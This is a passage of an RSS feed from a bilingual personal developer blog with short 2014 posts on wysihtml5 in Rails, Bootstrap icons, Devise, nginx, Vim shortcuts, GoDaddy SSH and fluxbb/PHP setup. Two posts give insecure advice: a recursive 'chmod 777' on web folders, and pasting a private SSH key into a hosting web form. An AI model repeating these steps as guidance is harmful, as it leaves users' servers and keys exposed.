&lt;pre&gt;#wysihtml5-editor-toolbar {
  position: relative;
}

header {
  display: block;
  border-radius: 4px;
  width: 810px;
  background: #f6f6f6;
  position: relative;
  z-index: 1;
  text-align: center;
  border: 1px solid #ddd\9; /* IE 8 and below */
  background-image: linear-gradient(bottom, rgb(238,238,238) 0%, rgb(255,255,255) 100%);
  background-image: -o-linear-gradient(bottom, rgb(238,238,238) 0%, rgb(255,255,255) 100%);
  background-image: -moz-linear-gradient(bottom, rgb(238,238,238) 0%, rgb(255,255,255) 100%);
  background-image: -webkit-linear-gradient(bottom, rgb(238,238,238) 0%, rgb(255,255,255) 100%);
  background-image: -ms-linear-gradient(bottom, rgb(238,238,238) 0%, rgb(255,255,255) 100%);
  box-shadow: 0 0 4px 1px rgba(0, 0, 0, 0.3);
  font-size: 0;
  text-align: center;
}

.commands {
  border-left: 1px solid #ddd;
  display: inline-block;
}

[data-wysihtml5-command],
[data-wysihtml5-action],
.fore-color {
  position: relative;
  border-right: 1px solid #ddd;
  border-left: 1px solid #fff;
  list-style: none;
  font-size: 12px;
  display: inline-block;
  cursor: pointer;
  height: 40px;
  width: 68px;
}

[data-wysihtml5-command]:after,
[data-wysihtml5-action]:after,
.fore-color:after {
  content: "";
  background-image: url(../img/spr_toolbar_icons_r1.png);
  background-repeat: no-repeat;
  position: absolute;
  left: 0;
  right: 0;
  top: 0;
  bottom: 0;
}

[data-wysihtml5-command]:hover,
[data-wysihtml5-action]:hover,
.fore-color:hover {
  background-image: linear-gradient(bottom, rgb(229,240,226) 0%, rgb(255,255,255) 100%);
  background-image: -o-linear-gradient(bottom, rgb(229,240,226) 0%, rgb(255,255,255) 100%);
  background-image: -moz-linear-gradient(bottom, rgb(229,240,226) 0%, rgb(255,255,255) 100%);
  background-image: -webkit-linear-gradient(bottom, rgb(229,240,226) 0%, rgb(255,255,255) 100%);
  background-image: -ms-linear-gradient(bottom, rgb(229,240,226) 0%, rgb(255,255,255) 100%);
}

[data-wysihtml5-command="bold"]:after {
  background-position: 24px center;
}

[data-wysihtml5-command="italic"]:after {
  background-position: -48px center;
}

[data-wysihtml5-command="insertUnorderedList"]:after {
  background-position: -115px center;
}

[data-wysihtml5-command="insertOrderedList"]:after {
  background-position: -197px center;
}

[data-wysihtml5-command="formatBlock"][data-wysihtml5-command-value="h1"]:after {
  background-position: -344px center;
}

[data-wysihtml5-command="formatBlock"][data-wysihtml5-command-value="h2"]:after {
  background-position: -428px center;
}

[data-wysihtml5-command="createLink"]:after {
  background-position: -271px center;
}

[data-wysihtml5-command="insertImage"]:after {
  background-position: -513px center;
}

.fore-color:after {
  background-position: -741px center;
}

[data-wysihtml5-command="insertSpeech"]:after {
  background-position: -596px center;
}

[data-wysihtml5-action="change_view"]:after {
  background-position: -670px center;
}

.fore-color ul {
  display: none;
  position: absolute;
  z-index: 2;
  top: 40px;
  right: -1px;
  left: -2px;
  border: 1px solid #ccc;
  border-top: 0;
  background: #fff;
  overflow: hidden;
}

.fore-color li {
  display: block;
  margin: 3px;
  width: auto;
  border: 0;
  height: 15px;
}

.fore-color li:after {
  display: none;
}

.fore-color:hover ul {
  display: block;
}

.fore-color [data-wysihtml5-command-value="silver"] {
  background: silver !important;
}


.fore-color [data-wysihtml5-command-value="gray"] {
  background: gray !important;
}

.fore-color [data-wysihtml5-command-value="maroon"] {
  background: maroon !important;
}

.fore-color [data-wysihtml5-command-value="red"] {
  background: red !important;
}

.fore-color [data-wysihtml5-command-value="purple"] {
  background: purple !important;
}

.fore-color [data-wysihtml5-command-value="green"] {
  background: green !important;
}

.fore-color [data-wysihtml5-command-value="olive"] {
  background: olive !important;
}

.fore-color [data-wysihtml5-command-value="navy"] {
  background: navy !important;
}

.fore-color [data-wysihtml5-command-value="blue"] {
  background: blue !important;
}

.fore-color .wysihtml5-command-active {
  outline: 1px solid #666;
  outline-offset: 1px;
}

.wysihtml5-commands-disabled .fore-color ul {
  display: none;
}

.wysihtml5-action-active,
.wysihtml5-command-active {
  box-shadow: inset 0 1px 6px rgba(0, 0, 0, 0.2);
  background: #eee !important;
}

.wysihtml5-commands-disabled [data-wysihtml5-command],
.wysihtml5-commands-disabled .fore-color {
  opacity: 0.4;
  cursor: default;
  background-image: none !important;
}

[data-wysihtml5-dialog] {
  color: #333;
  font-size: 14px;
  text-align: left;
  border-radius: 4px;
  -ms-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
  border: 1px solid #ccc;
  padding: 5px 10px;
  background: #FFFBE0;
  position: absolute;
  width: 810px;
  text-align: center;
  top: 45px;
}

[data-wysihtml5-dialog] input {
  color: #333;
  border: 1px solid #ccc;
  padding: 3px;
  width: 300px;
}

[data-wysihtml5-dialog] input:focus {
  outline: 0;
  border: 1px solid #666;
}

[data-wysihtml5-dialog-action] {
  padding: 4px;
  color: #fff;
  cursor: pointer;
}

[data-wysihtml5-dialog-action="save"] {
  background: #007200;
}

[data-wysihtml5-dialog-action="cancel"] {
  background: #999;
}
&lt;/pre&gt;


&lt;p&gt;3. init the js script
&lt;/p&gt;
&lt;pre&gt;&amp;lt;script&amp;gt;
var editor = new wysihtml5.Editor("wysihtml5-textarea", { // id of textarea element
  toolbar:      "wysihtml5-toolbar", // id of toolbar element
  parserRules:  wysihtml5ParserRules // defined in parser rules set 
});
&amp;lt;/script&amp;gt;
&lt;/pre&gt;

&lt;p&gt;4. $ wget&amp;#160;http://xing.github.io/wysihtml5/img/spr_toolbar_icons_r1.png, copy it to /app/assets/images 
&lt;/p&gt;
&lt;pre&gt;$ mv spr_toolbar_icons_r1.png &lt;your_rails_folder&gt;/app/assets/images/wysihtml5_toolbar_icons.png
&lt;/your_rails_folder&gt;&lt;/pre&gt;

&lt;p&gt;5. edit wysihtml5.css:&lt;/p&gt;

change:  url(../img/spr_toolbar_icons_r1.png);
to:  url('/assets/wysihtml5_toolbar_icons.png');

&lt;p&gt;6. another css &lt;/p&gt;
&lt;pre&gt;html {
  background: transparent;
}

body {
  margin-bottom: 25px;
}

h1, h2 {
  line-height: 1;
  font-family: Rockwell, "Courier New", Courier, Georgia;
  border-bottom: 1px solid #999;
  font-weight: bold;
  margin: 0 5px 25px 0;
  padding: 0 0 8px;
}

h1 {
  font-size: 27px;
}

h2 {
  font-size: 18px;
}

p, li {
  line-height: 1.5;
}

p, ul, ol {
  padding-bottom: 25px;
}

a {
  color: inherit;
}

strong, b {
  font-weight: bold;
}

i, em {
  font-style: italic;
}

li {
  margin-left: 30px;
}

ul li {
  list-style: disc outside;
}

ol li {
  list-style: decimal outside;
}

li img {
  vertical-align: middle;
  margin: 2px 5px 5px 0;
}

.wysiwyg-color-black {
  color: black;
}

.wysiwyg-color-silver {
  color: silver;
}

.wysiwyg-color-gray {
  color: gray;
}

.wysiwyg-color-white {
  color: white;
}

.wysiwyg-color-maroon {
  color: maroon;
}

.wysiwyg-color-red {
  color: red;
}

.wysiwyg-color-purple {
  color: purple;
}

.wysiwyg-color-fuchsia {
  color: fuchsia;
}

.wysiwyg-color-green {
  color: green;
}

.wysiwyg-color-lime {
  color: lime;
}

.wysiwyg-color-olive {
  color: olive;
}

.wysiwyg-color-yellow {
  color: yellow;
}

.wysiwyg-color-navy {
  color: navy;
}

.wysiwyg-color-blue {
  color: blue;
}

.wysiwyg-color-teal {
  color: teal;
}

.wysiwyg-color-aqua {
  color: aqua;
}
&lt;/pre&gt;
&lt;p&gt;7. change the init js code &lt;/p&gt;
&lt;pre&gt;    &amp;lt;%= render :partial =&amp;gt; 'layouts/wysihtml5_toolbar' %&amp;gt;
    &amp;lt;%= f.text_area :content, {:style=&amp;gt;'width:810px; height: 1000px', :id =&amp;gt; 'wysihtml5-textarea'} %&amp;gt;

&amp;lt;%= coffee_script_tag do %&amp;gt;
$ -&amp;gt;
  editor = new wysihtml5.Editor "wysihtml5-textarea",
    toolbar:      "wysihtml5-toolbar",
    parserRules:  wysihtml5ParserRules
    stylesheets: ['/assets/wysihtml5', '/assets/wysihtml5-reset-min', '/assets/wysihtml5_editor' ]
&amp;lt;% end %&amp;gt;

&lt;/pre&gt;</description>
      <pubDate>Fri, 31 Jan 2014 07:41:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/using-wysihtml5-in-rails4</link>
    </item>
    <item>
      <title>Rails3/4中使用 bootstrap3 的图标（display bootstrap3 plyphicons in Rails3/4）</title>
      <description>&lt;p&gt; refer to: &lt;a href="http://www.erikminkel.com/2013/09/01/twitter-bootstrap-3-in-a-rails-4-application/" target="_blank"&gt;http://www.erikminkel.com/2013/09/01/twitter-bootstrap-3-in-a-rails-4-application/&lt;/a&gt;
&lt;/p&gt;

&lt;p&gt; bootstrap3 中的图标独立出去了，而且不再是png，而是 fonts.  所以，我们要特殊处理一下。 (the plyphicon is extacted from bootstrap3 as kinda of FONT, so we have to modify the bootstrap css file )&lt;/p&gt; 
&lt;pre&gt;1. copy fonts folder from bootstrap3 to your rails app.
2. modify the bootstrap.css:  (notice, url is: /assets, but not /assets/fonts ) 
@font-face {
  font-family: 'Glyphicons Halflings';
  src: url('/assets/glyphicons-halflings-regular.eot');
  src: url('/assets/glyphicons-halflings-regular.eot?#iefix') format('embedded-opentype'), url('/assets/glyphicons-halflings-regular.woff') format('woff'), url('/assets/glyphicons-halflings-regular.ttf') format('truetype'), url('/assets/glyphicons-halflings-regular.svg#glyphicons_halflingsregular') format('svg'); 
}

&lt;/pre&gt;</description>
      <pubDate>Fri, 31 Jan 2014 01:20:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/display-bootstrap-plyphicons-in-rails3-or-4</link>
    </item>
    <item>
      <title>rails  gem的实现模式( implementation for rails gem)</title>
      <description>&lt;p&gt;最典型的要数： devise.&lt;/p&gt;
&lt;p&gt;1. 初始化配置文件&lt;/p&gt;
&lt;pre&gt;$ bundle exec rails generate devise:install
      create  config/initializers/devise.rb
      create  config/locales/devise.en.yml

Some setup you must do manually if you haven't yet:
  1. Ensure you have defined default url options in your environments files. Here 
     is an example of default_url_options appropriate for a development environment 
     in config/environments/development.rb:
       config.action_mailer.default_url_options = { :host =&amp;gt; 'localhost:3000' }
     In production, :host should be set to the actual host of your application.

  2. Ensure you have defined root_url to *something* in your config/routes.rb.
     For example:
       root :to =&amp;gt; "home#index"

  3. Ensure you have flash messages in app/views/layouts/application.html.erb.
     For example:
       &amp;lt;p class="notice"&amp;gt;&amp;lt;%= notice %&amp;gt;&amp;lt;/p&amp;gt;
       &amp;lt;p class="alert"&amp;gt;&amp;lt;%= alert %&amp;gt;&amp;lt;/p&amp;gt;

  4. If you are deploying on Heroku with Rails 3.2 only, you may want to set:
       config.assets.initialize_on_precompile = false
     On config/application.rb forcing your application to not access the DB
     or load models when precompiling your assets.

  5. You can copy Devise views (for customization) to your app by running:
       rails g devise:views
&lt;/pre&gt;
&lt;p&gt;2. generate model: &lt;/p&gt;
&lt;pre&gt;$ bundle exec rails generate devise user
      invoke  active_record
      create    db/migrate/20140130232140_devise_create_users.rb
      create    app/models/user.rb
      invoke    rspec
      create      spec/models/user_spec.rb
      invoke      factory_girl
      create        spec/factories/users.rb
      insert    app/models/user.rb
       route  devise_for :users
&lt;/pre&gt;

&lt;p&gt;3. its model: &lt;/p&gt;
&lt;pre&gt;class User &amp;lt; ActiveRecord::Base
  # Include default devise modules. Others available are:
  # :token_authenticatable, :confirmable,
  # :lockable, :timeoutable and :omniauthable
  devise :database_authenticatable, :registerable,
         :recoverable, :rememberable, :trackable, :validatable, :confirmable
end
&lt;/pre&gt;</description>
      <pubDate>Thu, 30 Jan 2014 23:13:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/implementation-for-rails-gem</link>
    </item>
    <item>
      <title>nginx + thin 配置 nginx 提供 assets ( nginx + thin, config nginx server static assets)</title>
      <description>&lt;p&gt;an example from railsgirlschina.com: &lt;/p&gt;
&lt;p&gt;(notice : &amp;#160;root for location ~ ^/assets/ is : /opt/app/siwei/rails_girls_cn/shared; , 
but not : /opt/app/siwei/rails_girls_cn/shared/assets 
&lt;/p&gt;

&lt;pre&gt;  server {
          listen       80; 
          server_name  www.railsgirlschina.com railsgirlschina.com www.railsgirlsbeijing.com railsgirlsbeijing.com;
          charset utf-8;
          location / { 
              proxy_pass          http://rails_girls_site;
              proxy_redirect      default;
              proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;
              proxy_set_header    X-Real-IP $remote_addr;
              proxy_set_header    Host $http_host;
              proxy_next_upstream http_502 http_504 error timeout invalid_header;
          }   
          location ~ ^/assets/ {
            root /opt/app/siwei/rails_girls_cn/shared;
            expires 1y; 
            add_header Cache-Control public;
            add_header ETag ""; 
            break;
          }   
  }
  upstream rails_girls_site{
    server localhost:3560;
    server localhost:3561;
  }

&lt;/pre&gt;</description>
      <pubDate>Thu, 30 Jan 2014 08:11:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/config-nginx-serve-static-assets</link>
    </item>
    <item>
      <title>ubuntu中 .bash_profile 会使 .bashrc失效  (remove bash_profile if you want your bashrc take effect in ubuntu)</title>
      <description>&lt;p&gt;过去一直发现自己的~/.bashrc 不会随着用户的登录而自动加载。今天无意当中发现 /root 目录下多了一个 ~/.bash_profile的文件。 size = 0. 我很好奇，于是把它删掉。重新登录，发现~/.bashrc 居然可以使用了乐乐乐乐乐 。。。。 我很开心：） &amp;#160;(these days I had a problem while ssh-login to my VPS that the ~/.bashrc was not auto-loaded. &amp;#160;just now after my login , I found there's a blank .bash_profile in my home folder. &amp;#160;Delete it, logout, login, and .bashrc takes effect again~ )&lt;/p&gt;
&lt;p&gt;学习是王道啊，自己有时间的时候应该读些linux的基本资料。 &amp;#160;( what if I had enough time..... &amp;gt;_&amp;lt;)&amp;#160;&lt;/p&gt;</description>
      <pubDate>Thu, 30 Jan 2014 07:49:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/remove-bash-profile-if-you-want-bashrc-take-effect</link>
    </item>
    <item>
      <title>LINUX 中的操作快捷键：   shortcuts in linux comandline</title>
      <description>LINUX 中的操作快捷键：  
&lt;pre&gt;全屏： F11  ( fullscreen) 
下一个标签：  ctrl + page_down  (next tab)
上一个标签：  ctrl + page_up  (previous tab) 
第一个标签：  alt + 1  (first tab)
最后一个标签： alt + 9  (last tab) 
快速打开 command line:  ctrl + alt + t  (new console)
在command line 中新建标签页 ： ctrl + shift + t    (new tab)
快速关闭当前cmd标签：  ctrl + shift + w   (close current tab)
把当前的标签页前移或者后移： ctrl + shift + page_down/page_up  (move to next/previous)
快速定位之前的操作:  ctrl + r   (reverse search previous command) 
切换到上一个窗口:  alt + tab    (switch to previous window) 
在command line的已经输入的命令中，快速的左右移动光标：  ctrl + left/right  (fast-move the cursor) 
&lt;/pre&gt;</description>
      <pubDate>Wed, 29 Jan 2014 06:13:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/shortcuts-in-linux-commandline</link>
    </item>
    <item>
      <title>接触一个新编辑器时，我最关心的几个功能： (the most important features that I care for a new editor) </title>
      <description>&lt;p&gt;1。快速打开： &amp;#160; Eclipse 中是 ctrl + shift + r, &amp;#160;VIM: &amp;#160;ctrl + t, &amp;#160;sublime: &amp;#160;cmd + p&lt;/p&gt;
&lt;p&gt;2. 上一次打开的文件： &amp;#160;Eclipse 中： ctrl + e &amp;#160;, vim ctrl + e, sublime: &amp;#160;无。 还是用cms+ p&lt;/p&gt;
&lt;p&gt;3. 查找和替换。 Eclipse: &amp;#160;ctrl + shift + f, (似乎）, vim : &amp;#160;Gsearch. &amp;#160;sublime: 无。 &amp;#160;貌似无快捷键。&lt;/p&gt;
&lt;p&gt;4. 跳到上一次的编辑位置： &amp;#160;Eclipse: alt + left/right, &amp;#160;vim: &amp;#160;g; &amp;#160;g, &amp;#160; &amp;#160; .sublime: &amp;#160;ctrl+ z, ctrl + y&lt;/p&gt;</description>
      <pubDate>Wed, 29 Jan 2014 06:01:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/the-most-important-features-for-new-editor</link>
    </item>
    <item>
      <title>VIM中的常见操作：  (common operations in VIM) </title>
      <description>&lt;p&gt; 如下，都是我常用的 &lt;/p&gt; 

&lt;pre&gt;上下左右：  jkhl
下一个单词：  w
前一个单词：  b
下一屏： ctrl + f 
上一屏 :  ctrl + b
搜索some_string：    /some_string
把全局的some_string 替换成 new_string :   %s/some_string/new_string/g
继续搜索下一个：  n
继续搜索前一个 :   N (shift + n)
补全：    ctrl + n ,  ctrl + p  (next, previous的缩写)
删掉一个字母：  x
删掉一个单词：  dw
删掉一行：   dd
删掉3行：    3d
复制一个单词：  yw
复制当前行： yy
粘贴： p
选中N行：   shift + v , 再 jk
快速打开一个文件：  ctrl + t
快速打开前一个文件：  ctrl + e
跳到文件头： gg
跳到文件末尾： shift + g
在光标前新增内容： i  (insert的缩写)
在光标后新增内容： a (add的缩写）
快速的跳到该行最后：  shift + 4
快速的跳到该行最前：  0
上一次编辑的地方：  g;
下一次编辑的地方：  g,
&lt;/pre&gt;</description>
      <pubDate>Wed, 29 Jan 2014 05:59:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/common-operations-in-vim</link>
    </item>
    <item>
      <title>在godaddy 主机上操作github项目。(work under github and godaddy host)</title>
      <description>&lt;p&gt;如题。&lt;/p&gt;
&lt;p&gt;也基本上算是自己第一次写的PHP代码。 (this is my first PHP experience. )&lt;/p&gt;
&lt;p&gt;后来发现 fluxbb版本不吻合，于是自己的代码没办法直接merge过去。只好手动修改。发现居然可以直接在godaddy上操作 github的push/pull. 很给力。所以直接新建了一个项目。 ( however I found that the fluxbb versions don't match between godaddy.com and my github repo, and my commits could not be merged, I have to merge them manually. It's a surprise that we can do git operations on godaddy.com, oh yeah! so a new forum project was copied from godaddy to my github repo and it will be maintained in future more conveniently)&amp;#160;&lt;/p&gt;
&lt;p&gt;1. $ ssh ziwokangfu.com&lt;/p&gt;
&lt;p&gt;2. $ cd forum&amp;#160;&lt;/p&gt;
&lt;p&gt;3. $ git init . &amp;#160;/ git commit&lt;/p&gt;
&lt;p&gt;4. create a new repo on github.&amp;#160;&lt;/p&gt;
&lt;p&gt;5. add ziwokangfu.com's id_rsa.pub file to github.&lt;/p&gt;
&lt;p&gt;6. $ git push ....&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSJEMjAxNC8wMS8yOS8wN181N18zOF8zODlfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMDFfMjlfMDdfNTZfNDYucG5nBjoGRVQ/Screenshot%20from%202014-01-29%2007png:46.:ext" title="Screenshot From 2014 01 29 07:56:46" alt="Screenshot From 2014 01 29 07:56:46" rel="225x255" width="1366" height="768" /&gt;&amp;#160;&lt;/p&gt;</description>
      <pubDate>Tue, 28 Jan 2014 23:52:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/work-under-github-and-godaddy-host</link>
    </item>
    <item>
      <title>如何管理godaddy host (how to manage godaddy host)</title>
      <description>&lt;p&gt;前些日子在godaddy上买了个空间，放了一个论坛（ziwokangfu.com) 。并且加上了注册验证的功能。 现在要把代码放上去。&lt;/p&gt;
&lt;p&gt;步骤：&lt;/p&gt;
&lt;p&gt;1. 登录godaddy. (login to godaddy)&amp;#160;
&lt;/p&gt;
&lt;p&gt;2. 进入 web hosting &amp;#160;(enter the web hosting area)&amp;#160;
&lt;/p&gt;
&lt;p&gt;3. control + F, 找到 'ssh shell'. &amp;#160;(ctrl + f to find the 'ssh shell' link, click it)
&lt;/p&gt;
&lt;p&gt;4. 进入到了这个页面，把你的id_rsa 和 id_rsa.pub 分别粘贴进去，保存。 &amp;#160;(generate , copy &amp;amp; paste your private, public keys )
&lt;/p&gt;
&lt;p&gt;4.1 &amp;#160;click 'import key' button. ( if you are like me that already have a ssh key generated)&amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSI9MjAxNC8wMS8yOS8wNl80MF8yMV8yODBfZ29kYWRkeV9tYW5hZ2Vfc3NoX2tleV9zdGVwMS5wbmcGOgZFVA/godaddy_manage_ssh_key_step1.png" title="Godaddy Manage Ssh Key Step1" alt="Godaddy Manage Ssh Key Step1" rel="225x255" width="1366" height="768" /&gt;&lt;/p&gt;
&lt;p&gt;4.2 fill this form. &amp;#160;the private key == id_rsa, &amp;#160;the public key == id_rsa.pub (in your ~/.ssh folder)&amp;#160;&lt;img src="/system/images/BAhbBlsHOgZmSSJRMjAxNC8wMS8yOS8wNl80MF8yMV81MjlfZ29kYWRkeV9tYW5hZ2Vfc3NoX2tleV9zdGVwMl9wYXN0ZV95b3VyX3NzaF9rZXlzLnBuZwY6BkVU/godaddy_manage_ssh_key_step2_paste_your_ssh_keys.png" title="Godaddy Manage Ssh Key Step2 Paste Your Ssh Keys" alt="Godaddy Manage Ssh Key Step2 Paste Your Ssh Keys" rel="225x255" width="1366" height="768" /&gt;&lt;/p&gt;
&lt;p&gt;step3. make this ssh key enabled by clicking the number '0' . &amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSJBMjAxNC8wMS8yOS8wNl80N18zMV84M19nb2RhZGR5X21hbmFnZV9zc2hfa2V5X3N0ZXA0X2RvbmUucG5nBjoGRVQ/godaddy_manage_ssh_key_step4_done.png" title="Godaddy Manage Ssh Key Step4 Done" alt="Godaddy Manage Ssh Key Step4 Done" rel="225x255" width="1366" height="768" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSJHMjAxNC8wMS8yOS8wNl80MF8yMV83NTRfZ29kYWRkeV9tYW5hZ2Vfc3NoX2tleV9zdGVwM19lbmFibGVfaXQucG5nBjoGRVQ/godaddy_manage_ssh_key_step3_enable_it.png" title="Godaddy Manage Ssh Key Step3 Enable It" alt="Godaddy Manage Ssh Key Step3 Enable It" rel="225x255" width="1366" height="768" /&gt;&lt;/p&gt;
&lt;p&gt;5. done. now login using your hostname:&amp;#160;
&lt;/p&gt;
&lt;pre&gt;siwei@siwei-Lenovo-V470c:/workspace/rails_girls_cn$ ssh ziwokangfu.com -l ziwokangfu
Attempting to create directory /home/ziwokangfu/perl5
ziwokangfu@p3plcpnl0040 [~]$ pwd
/home/ziwokangfu
ziwokangfu@p3plcpnl0040 [~]$ ls
./            .appdata/             .bash_profile  .cl.selector/  cpbackup-exclude.conf  .htpasswds/  public_ftp/   ssl/     www@
../           application_backups/  .bashrc        .contactemail  etc/                   mail/        public_html/  tmp/
access-logs@  .bash_logout          .cagefs/       .cpanel/       .gemrc                 perl5/       .ssh/         .trash/
&lt;/pre&gt;</description>
      <pubDate>Tue, 28 Jan 2014 22:32:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/manage-godaddy-host</link>
    </item>
    <item>
      <title>配置fluxbb的开发环境( setup and run fluxbb in ubuntu )</title>
      <description>&lt;p&gt;最近被fluxbb的注册机弄得头大，所以必须要加上个验证码了。 &amp;#160;(these days I have been borned by the spams on my fluxbb forum. It's time for me to create something like 'validation code' to fluxbb)&lt;/p&gt;
&lt;p&gt;步骤：&lt;/p&gt;
&lt;p&gt;1. 设置PHP的环境（apache + php + mysql. ) 见前一篇文章。  ( refer there my previous post to know how to &lt;a href="http://siwei.me/blog/posts/setup-php-environment-in-ubuntu" target="_blank"&gt;seup fluxbb environment&lt;/a&gt; )&amp;#160;&lt;/p&gt;
&lt;p&gt;2. fork &lt;a href="https://github.com/fluxbb/fluxbb" target="_blank"&gt;fluxbb on github &lt;/a&gt;: &lt;/p&gt;
&lt;p&gt;3. clone your forked code and then config your apache file, restart apache : 
&lt;/p&gt;
&lt;pre&gt;  
&amp;lt; VirtualHost *:6060&amp;gt;
  ServerAdmin webmaster@localhost
  DocumentRoot /sg552/workspace/fluxbb
  .....

&lt;/pre&gt;
&lt;pre&gt;$ sudo /etc/init.d/apache2 restart
&lt;/pre&gt;

&lt;p&gt; 4. 打开： localhost:6060, 然后根据它的提示，把一些文件夹的权限加上： open 'localhost:6060' and then follow its instructions:  &lt;/p&gt;
&lt;pre&gt;$ chmod 777 -R cache/ 
$ chmod 777 -R img/avatars/
&lt;/pre&gt;
&lt;p&gt; 5. 建立mysql 数据库 &amp;#160;(create mysql database)&amp;#160;&lt;/p&gt;
&lt;pre&gt;$ mysql -u root 
&amp;gt; create database fluxbb
&lt;/pre&gt;
&lt;p&gt;6. 按照提示下载这个文件，并且把它加到fluxbb的目录下（ download and move this config.php file to your root of fluxbb folder)&amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSI3MjAxNC8wMS8yNy8xNV8wN18zMF8xMV9mbHV4YmJfZmluYWxpemVfaW5zdGFsbC5wbmcGOgZFVA/fluxbb-finalize-install.png" title="Fluxbb Finalize Install" alt="Fluxbb Finalize Install" rel="225x255" width="758" height="443" /&gt;&lt;/p&gt;
&lt;p&gt;大功告成！～ &amp;#160; （ well done! )&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSJDMjAxNC8wMS8yNy8xNV8wOF8xN18yMF9TY3JlZW5zaG90X2Zyb21fMjAxNF8wMV8yN18xNV8wN181OS5wbmcGOgZFVA/Screenshot%20from%202014-01-27%2015png:59.:ext" title="Screenshot From 2014 01 27 15:07:59" alt="Screenshot From 2014 01 27 15:07:59" rel="225x255" width="1280" height="800" /&gt;&lt;/p&gt;</description>
      <pubDate>Mon, 27 Jan 2014 07:00:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/setup-and-run-fluxbb-in-ubuntu</link>
    </item>
    <item>
      <title>learn x in y minutes</title>
      <description>&lt;p&gt;今天抱着学习PHP的心态，发现了这个有意思的站点： &lt;a target="_blank" href="http://learnxinyminutes.com/docs/php/"&gt;http://learnxinyminutes.com/docs/php/&lt;/a&gt;&amp;#160; (today I found this interesting website: )&amp;#160;&lt;/p&gt;
&lt;p&gt;非常棒，跟我之前想到的3分钟学习一种新技术 非常接近。 &amp;#160;(it's so great that I had the same idea....)&lt;/p&gt;
&lt;p&gt;希望它们越做越好。 欢迎贡献代码：  &lt;a target="_blank" href="https://github.com/adambard/learnxinyminutes-docs"&gt;https://github.com/adambard/learnxinyminutes-docs&lt;/a&gt;&amp;#160;(welcome to contribute your code here)&amp;#160;&lt;/p&gt;</description>
      <pubDate>Mon, 27 Jan 2014 03:02:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/learn-x-in-y-minutes</link>
    </item>
    <item>
      <title>设置PHP的开发环境（setup php environment in ubuntu)</title>
      <description>&lt;p&gt;前些日子搭建了一个 自我康复网的论坛(ziwokangfu.com) ，使用的是fluxbb( php forum)，发现被注册机注册了很多用户，发表了很多的垃圾帖子。实在不能忍了，哥要给它加上验证码～&lt;/p&gt;
&lt;p&gt;开了一下PHP， 它跟JSP好像啊！ &amp;#160;HTML页面里嵌套 php代码。不错，上手很快（但是不用框架的话很快就要失去控制了，这个不谈）&lt;/p&gt;
&lt;p&gt;所以先下载fluxbb的源代码。&lt;br /&gt;$ git clone https://github.com/fluxbb/fluxbb.git&lt;/p&gt;
&lt;p&gt;然后搭建PHP开发环境。
&lt;/p&gt;
&lt;pre&gt;  $ sudo apt-get install apache2 php5 php5-mysql (php5-fpm)
&lt;/pre&gt;
&lt;p&gt;如果你安装了nginx, 就要记得不要与 apache的端口相冲突。 然后 进入到root path (/var/www) ，编辑文件： hello.php:&amp;#160;&lt;/p&gt;
&lt;pre&gt;&amp;lt;?php echo 'Hello, World! This is my first php page~'; ?&amp;gt;
&lt;/pre&gt;
&lt;p&gt;访问 localhost:6060&lt;/p&gt; &lt;img src="/system/images/BAhbBlsHOgZmSSIqMjAxNC8wMS8yNy8xNF8zN18xMl82MTFfZmlyc3RfcGhwLnBuZwY6BkVU/first_php.png" title="First Php" alt="First Php" rel="225x255" width="375" height="138" /&gt;
</description>
      <pubDate>Mon, 27 Jan 2014 02:02:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/setup-php-environment-in-ubuntu</link>
    </item>
    <item>
      <title>ruby中最牛找方法定义的办法。(the strongest way to find where a ruby method defined)</title>
      <description>&lt;p&gt;
让这个方法出错，然后在backtrace中就可以找到它是在哪里定义的了 ^_^  ( make error on this method on purpose, e.g. pass incorrect parameters, and you will see where it is defined )
&lt;/p&gt;
&lt;p&gt;
refer to: &lt;a href="http://stackoverflow.com/questions/13514597/where-does-the-underscore-syntax-in-typo-erb-files-come-from"&gt;http://stackoverflow.com/questions/13514597/where-does-the-underscore-syntax-in-typo-erb-files-come-from&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Sat, 25 Jan 2014 00:28:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/the-best-way-to-find-where-method-is-defined</link>
    </item>
    <item>
      <title>如何贡献你的代码？(how to contribe to open source projects)</title>
      <description>&lt;p&gt;contribe your code， 挥一挥衣袖, &amp;#160;深藏功与名。。。&lt;/p&gt;
&lt;p&gt;1. fork the project on github.&lt;/p&gt;
&lt;p&gt;2. edit&lt;/p&gt;
&lt;p&gt;3. commit &amp;amp; push&lt;/p&gt;
&lt;p&gt;4. send a pull request.&amp;#160;&lt;/p&gt;
&lt;p&gt;e.g. 我想为 publify 这个项目增加汉化文件。就：&lt;/p&gt;
&lt;p&gt;1. fork the project.&lt;/p&gt;
